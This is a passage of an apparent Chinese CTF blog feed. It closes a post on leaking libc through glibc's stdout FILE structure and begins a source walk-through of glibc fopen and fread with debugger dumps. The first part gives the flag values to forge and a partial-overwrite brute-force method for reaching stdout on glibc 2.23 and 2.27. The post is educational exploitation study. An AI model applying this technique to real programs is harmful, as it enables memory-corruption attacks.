(before and after) is</span><br><span class="line">       unpredictable. */</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      off64_t new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);</span><br><span class="line">      if (new_pos == _IO_pos_BAD)</span><br><span class="line">return 0;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  if (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">      fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;</span><br></pre></td></tr></table></figure><p>所以稍微总结下要注意的标志位，利用时也是注意这几个即可</p><p>_IO_NO_WRITE = 0<br>_IO_CURRENTLY_PUTTING = 1<br>_IO_UNBUFFERED = 1 || _IO_LINE_BUF = 1          // 这两个好像不需要构造，没有特别理解，挖坑<br>_IO_IS_APPENDING = 1 || _IO_read_end==_IO_write_base</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>2.23 等没有tcache利用unsorted bin在fastbin的chunk的fd指针上覆盖出main_arena附近的地址，然后利用部分地址覆盖对stdout地址进行爆破<br>（一般是半个字节，1/16的概率），然后尝试将fastbin分配到stdout处即可，因为一般的布局来讲，stdout上面是stderr，其中有0x7f开头的地址，通过偏移进行设计即可</p><p>2.27 等有tcache的版本，也是利用unsorted bin在tcache的fd上覆盖出main_arena附近的地址，部分地址覆盖完之后尝试将其分配出去即可，因为低版本的tcache很少检查size，所以可能会更方便点。</p><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p><a href="https://siriuswhiter.github.io/2019/07/30/ciscn-2019-%E5%86%B3%E8%B5%9Bpwn/#6" target="_blank" rel="noopener">https://siriuswhiter.github.io/2019/07/30/ciscn-2019-%E5%86%B3%E8%B5%9Bpwn/#6</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h1&gt;&lt;p&gt;细节知识可以看&lt;a href=&quot;https://www.siriuswhiter.tk/2019/07/08/io-file
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="file" scheme="http://siriuswhiter.tk/tags/file/"/>
    
  </entry>
  
  <entry>
    <title>_IO_FILE 源码分析</title>
    <link href="http://siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://siriuswhiter.tk/2019/07/08/io-file-源码分析/</id>
    <published>2019-07-08T05:33:38.000Z</published>
    <updated>2019-09-28T05:06:54.867Z</updated>
    
    <content type="html"><![CDATA[<p><em>_IO_File 是个比较神奇的东西，而且用起来比较方便，因此花点时间捋一下它的源码，方便后面的精进</em></p><p>这里使用glibc 2.23的源码进行调试，需要注意的是2.23版本之后的vtable添加了检查，这里调试的是没有检查的，加了debug symbol的glibc。源码与编译方式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//gcc -Wl,-dynamic-linker /glibc/glibc-2.23/debug_x64/lib/ld-linux-x86-64.so.2 -o iofile -g iofile.c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">FILE*fp1=fopen(&quot;test1&quot;,&quot;wb+&quot;);</span><br><span class="line"></span><br><span class="line">char data1[20];</span><br><span class="line">fread(data1,1,20,fp1);</span><br><span class="line"></span><br><span class="line">  FILE*fp2=fopen(&quot;test2&quot;,&quot;wb&quot;);</span><br><span class="line"></span><br><span class="line">char data2[20]=&#123;&quot;abcdefghij1234567890&quot;&#125;;</span><br><span class="line">fwrite(data2,1,20,fp2);</span><br><span class="line"></span><br><span class="line">fclose(fp1);</span><br><span class="line">    fclose(fp2);</span><br><span class="line">return 0;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p>malloc为结构体分配内存空间。</p><p>_IO_no_init 对FILE结构体进行初始化。</p><p>_IO_file_init将结构体链接进_IO_list_all链表。</p><p>_IO_file_fopen执行系统调用打开文件。</p><p>返回句柄。</p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><h3 id="fopen-gt-IO-new-fopen"><a href="#fopen-gt-IO-new-fopen" class="headerlink" title="fopen-&gt;_IO_new_fopen"></a>fopen-&gt;_IO_new_fopen</h3><p>跟进去,发现是_IO_new_fopen函数，在libio/iofopen.c中。（这里展示的不是2.23的代码，所以与下面调试时的代码会有所偏差）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (const char *filename, const char *mode)</span><br><span class="line">&#123;</span><br><span class="line">  return __fopen_internal (filename, mode, 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继续跟进__fopen_internal</p><h4 id="fopen-internal"><a href="#fopen-internal" class="headerlink" title="__fopen_internal"></a>__fopen_internal</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (const char *filename, const char *mode, int is32)</span><br><span class="line">&#123;</span><br><span class="line">  struct locked_FILE</span><br><span class="line">  &#123;</span><br><span class="line">    struct _IO_FILE_plus fp;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line">#endif</span><br><span class="line">    struct _IO_wide_data wd;</span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</span><br><span class="line"></span><br><span class="line">  if (new_f == NULL)</span><br><span class="line">    return NULL;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line">#endif</span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);    //对file结构体new_f进行初始化。</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;                             // 设置vtable为_IO_file_jumps</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);                              // 将file结构体链接进去_IO_list_all</span><br><span class="line">  if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL)</span><br><span class="line">    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  free (new_f);</span><br><span class="line">  return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到先申请了一个locked_FILE 结构体，其内部有三个结构体，分别为<em>fp = _IO_FILE_plus,</em>lock = _IO_lock_t,*wd = _IO_wide_data<br>太大了就不贴出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print new_f</span><br><span class="line">$3 = (struct locked_FILE *) 0x602010</span><br><span class="line">pwndbg&gt; x/20gx 0x602010-0x10</span><br><span class="line">0x602000:0x00000000000000000x0000000000000231</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><h5 id="IO-no-init"><a href="#IO-no-init" class="headerlink" title="_IO_no_init"></a>_IO_no_init</h5><p>继续跟进,_IO_no_init 对file结构体进行初始化。这里2.23版本是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">   _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">#else</span><br><span class="line">   _IO_no_init (&amp;new_f-&gt;fp.file, 1, 0, NULL, NULL);</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>进入函数内部，该函数位于/libio/genops.c中，开始时进入_IO_old_init (fp, flags)，对fp结构体部分初始化，绝大多数为空，返回后主要对fp-&gt;_wide_data结构体进行了初始化。</p><p>返回后设置vtable为_IO_file_jumps。</p><h5 id="IO-file-init"><a href="#IO-file-init" class="headerlink" title="_IO_file_init"></a>_IO_file_init</h5><p>继续运行，调用_IO_file_init (&amp;new_f-&gt;fp)，这里位于/libio/fileops.c;</p><p>将前面创建的file结构体放入_IO_list_all中。可以看到主体是调用的_IO_link_in(fp)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_file_init (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  /* POSIX.1 allows another file handle to be used to change the position</span><br><span class="line">     of our file descriptor.  Hence we actually don&apos;t know the actual</span><br><span class="line">     position before we do the first fseek (and until a following fflush). */</span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="IO-link-in"><a href="#IO-link-in" class="headerlink" title="_IO_link_in"></a>_IO_link_in</h6><p>跟进该函数,又回到了genops.c中，看到开始检查flag的标志位是否是_IO_LINKED，因为FILE结构体是通过_IO_list_all的单链表进行组织管理的，所以如果不在链表中便对其进行相应的处理，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_link_in (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line">#endif</span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>查看下_IO_list_all申请的结构体,即前面三个结构体中第一个结构体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *_IO_list_all</span><br><span class="line">$5 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72538996, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd6540 &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = -1, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x6020f0, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x602100, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd46e0 &lt;__GI__IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>函数返回到__fopen_internal中，进入一个判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL)</span><br><span class="line">    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br></pre></td></tr></table></figure></p><h4 id="IO-new-file-fopen"><a href="#IO-new-file-fopen" class="headerlink" title="_IO_new_file_fopen"></a>_IO_new_file_fopen</h4><p>跟进判断函数，跳转到了/libio/fileops.c中的_IO_new_file_fopen函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_fopen (FILE *fp, const char *filename, const char *mode,</span><br><span class="line">    int is32not64)</span><br></pre></td></tr></table></figure></p><p>前面先检查文件是否打开，之后设置打开模式，最后调用 _IO_file_open</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">  is32not64);</span><br></pre></td></tr></table></figure><h5 id="IO-file-open"><a href="#IO-file-open" class="headerlink" title="_IO_file_open"></a>_IO_file_open</h5><p>跟进_IO_file_open函数，可以看到，调用了系统级函数__open打开文件，之后设置fp-&gt;_fileno为文件描述符，最后再次调用_IO_link_in确保设置进入_IO_list_all。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_file_open (FILE *fp, const char *filename, int posix_mode, int prot,</span><br><span class="line">       int read_write, int is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  int fdesc;</span><br><span class="line">  if (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">    fdesc = __open_nocancel (filename,</span><br><span class="line">     posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);</span><br><span class="line">  else</span><br><span class="line">    fdesc = __open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);</span><br><span class="line">  if (fdesc &lt; 0)</span><br><span class="line">    return NULL;</span><br><span class="line">  fp-&gt;_fileno = fdesc;</span><br><span class="line">  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">  /* For append mode, send the file offset to the end of the file.  Don&apos;t</span><br><span class="line">     update the offset cache though, since the file handle is not active.  */</span><br><span class="line">  if ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      off64_t new_pos = _IO_SYSSEEK (fp, 0, _IO_seek_end);</span><br><span class="line">      if (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">&#123;</span><br><span class="line">  __close_nocancel (fdesc);</span><br><span class="line">  return NULL;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_link_in ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  return fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>之后返回之后调用了__fopen_maybe_mmap，之后将fp指针返回，整个流程就结束了。</p><h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><h2 id="框架-1"><a href="#框架-1" class="headerlink" title="框架"></a>框架</h2><p>如果_IO_buf_base为空，调用_IO_doallocbuf(fp)初始化指针，建立输入缓冲区</p><p>根据输入缓冲区与目标缓冲区情况分别进行处理，底层调用read的系统调用来进行读取并复制</p><h2 id="细节-1"><a href="#细节-1" class="headerlink" title="细节"></a>细节</h2><p>进入之前再查看下FILE结构体fp指针的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *fp</span><br><span class="line">$6 = &#123;</span><br><span class="line">  _flags = -72539008, </span><br><span class="line">  _IO_read_ptr = 0x0, </span><br><span class="line">  _IO_read_end = 0x0, </span><br><span class="line">  _IO_read_base = 0x0, </span><br><span class="line">  _IO_write_base = 0x0, </span><br><span class="line">  _IO_write_ptr = 0x0, </span><br><span class="line">  _IO_write_end = 0x0, </span><br><span class="line">  _IO_buf_base = 0x0, </span><br><span class="line">  _IO_buf_end = 0x0, </span><br><span class="line">  _IO_save_base = 0x0, </span><br><span class="line">  _IO_backup_base = 0x0, </span><br><span class="line">  _IO_save_end = 0x0, </span><br><span class="line">  _markers = 0x0, </span><br><span class="line">  _chain = 0x7ffff7dd6540 &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">  _fileno = 3, </span><br><span class="line">  _flags2 = 0, </span><br><span class="line">  _old_offset = 0, </span><br><span class="line">  _cur_column = 0, </span><br><span class="line">  _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">  _shortbuf = &quot;&quot;, </span><br><span class="line">  _lock = 0x6020f0, </span><br><span class="line">  _offset = -1, </span><br><span class="line">  _codecvt = 0x0, </span><br><span class="line">  _wide_data = 0x602100, </span><br><span class="line">  _freeres_list = 0x0, </span><br><span class="line">  _freeres_buf = 0x0, </span><br><span class="line">  __pad5 = 0, </span><br><span class="line">  _mode = 0, </span><br><span class="line">  _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="fread-gt-IO-fread"><a href="#fread-gt-IO-fread" class="headerlink" title="fread-&gt;_IO_fread"></a>fread-&gt;_IO_fread</h3><p>跟进fread函数，看到是位于/libio/fread.c中的_IO_fread,看到先计算了请求字节数，之后对fp加锁，执行_IO_sgetn，之后释放锁。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_fread (void *buf, size_t size, size_t count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t bytes_requested = size * count;</span><br><span class="line">  size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, 0);</span><br><span class="line">  if (bytes_requested == 0)</span><br><span class="line">    return 0;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  return bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="IO-sgetn-gt-IO-XSGETN"><a href="#IO-sgetn-gt-IO-XSGETN" class="headerlink" title="_IO_sgetn ==&gt; _IO_XSGETN"></a>_IO_sgetn ==&gt; _IO_XSGETN</h4><p>可以看到主体应该是_IO_sgetn函数，跟进该函数,发现主体为_IO_XSGETN函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_sgetn (FILE *fp, void *data, size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  /* FIXME handle putback buffer here! */</span><br><span class="line">  return _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_sgetn)</span><br></pre></td></tr></table></figure></p><p>查看定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span><br></pre></td></tr></table></figure></p><p>继续跟进，进入/libio/fileops.c，该函数较长，做了不少事情。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_file_xsgetn (FILE *fp, void *data, size_t n)</span><br></pre></td></tr></table></figure></p><p>如果_IO_buf_base为空，调用_IO_doallocbuf(fp)初始化指针，建立输入缓冲区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_buf_base == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Maybe we already have a push back pointer.  */</span><br><span class="line">      if (fp-&gt;_IO_save_base != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  free (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h5 id="第一步：-IO-doallocbuf"><a href="#第一步：-IO-doallocbuf" class="headerlink" title="第一步：_IO_doallocbuf"></a>第一步：_IO_doallocbuf</h5><p>跟进_IO_doallocbuf,进入/libio/genops.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_doallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base)</span><br><span class="line">    return;</span><br><span class="line">  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0)</span><br><span class="line">    if (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">      return;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure></p><p>这里重新回顾下开始时的结构体状态，这些变量未被初始化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_read_ptr = 0x0, </span><br><span class="line">_IO_read_end = 0x0, </span><br><span class="line">_IO_read_base = 0x0, </span><br><span class="line">_IO_buf_base = 0x0, </span><br><span class="line">_IO_buf_end = 0x0,</span><br></pre></td></tr></table></figure></p><h6 id="IO-file-doallocate"><a href="#IO-file-doallocate" class="headerlink" title="_IO_file_doallocate"></a>_IO_file_doallocate</h6><p>因此开始检验是否被初始化，如果已经初始化就返回。检查标志位之后调用vtable中的_IO_file_doallocate，由注释可以看到这个函数主要用来分配输入缓冲区。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/* Allocate a file buffer, or switch to unbuffered I/O.  Streams for</span><br><span class="line">   TTY devices default to line buffered.  */</span><br><span class="line">int</span><br><span 